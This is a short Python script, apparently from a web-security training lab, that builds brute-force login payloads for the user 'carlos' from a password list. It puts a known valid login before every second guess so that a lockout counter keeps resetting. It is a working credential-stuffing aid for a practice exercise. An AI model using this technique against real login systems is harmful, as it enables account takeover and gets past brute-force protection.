#!/bin/python3
import pprint

passwords = []
with open('../passwords.lst') as f:
    passwords = f.read().splitlines()

counter = 2
pwdlist = []
for password in passwords:

	# Append valid credentials for every second password
	if counter == 2:
		pwdlist.append(f"username=wiener&password=peter")
		counter = 0

	pwdlist.append(f"username=carlos&password={password}")
	counter += 1

with open('04-generate-payloads.lst', 'w') as f:
	[f.writelines(i+'\n') for i in pwdlist]
		

pprint.pprint(pwdlist)